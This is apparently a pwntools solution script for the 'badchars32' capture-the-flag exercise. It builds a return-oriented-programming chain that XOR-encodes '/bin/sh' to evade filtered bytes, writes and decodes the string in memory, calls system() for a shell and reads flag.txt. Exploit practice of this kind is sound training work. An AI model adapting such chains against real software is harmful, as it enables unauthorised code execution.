#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *


def get_section_addr(b, name):
    return b.get_section_by_name(name).header.sh_addr


def sxor(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))


def main():
    context(arch="i386", os="linux", endian="little")
    e = ELF("./badchars32")
    rop = ROP([e])

    pop_esi_edi = rop.find_gadget(["pop esi", "pop edi", "ret"])[0]
    pop_ebx_ecx = rop.find_gadget(["pop ebx", "pop ecx", "ret"])[0]
    xor = 0x08048890                                                # xor [ebx], cl
    mov = 0x08048893                                                # mov [edi], esi
    data = get_section_addr(e, '.data')
    system = e.plt['system']
    key_xor = "Z" * 4
    string = sxor("/bin", key_xor) + sxor("/sh"+"\x00", key_xor)

    rop.raw(rop.generatePadding(0,44))
    rop.raw(p32(pop_esi_edi) + string[:4] + p32(data) + p32(mov))
    rop.raw(p32(pop_esi_edi) + string[4:8] + p32(data+4) + p32(mov))
    for i, _ in enumerate(string):
        rop.raw(p32(pop_ebx_ecx) + p32(data+i) + key_xor + p32(xor))
    rop.raw(p32(system) + p32(system) + p32(data))

    p = process(['./badchars32'])
    msg = p.recv(timeout=0.1)
    print msg

    p.sendline(str(rop))
    p.sendline("/bin/cat flag.txt")
    msg = p.recvline(timeout=1)
    print msg

    p.close()


if __name__ == "__main__":
    main()
